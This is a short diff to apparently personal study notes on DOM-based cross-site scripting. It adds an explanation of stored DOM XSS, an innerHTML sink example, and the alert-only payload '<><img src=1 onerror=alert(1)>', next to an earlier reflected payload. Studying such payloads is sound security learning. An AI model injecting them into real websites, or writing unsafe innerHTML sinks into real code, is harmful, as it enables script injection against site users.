@@ -203,4 +203,12 @@ Payload: \"-alert(1)}//
 
 								{"searchTerm":"\\"-alert(1)}//", "results":[]}
 								
-								
+
+# Websites may also store data on the server and reflect it elsewhere.
+# In a stored DOM XSS vulnerability, the server receives data from one request, stores it, and then includes the data in a later response.
+# A script within the later response contains a sink which then processes the data in an unsafe way. 
+
+Payload: element.innerHTML = comment.author
+
+<><img src=1 onerror=alert(1)>
+
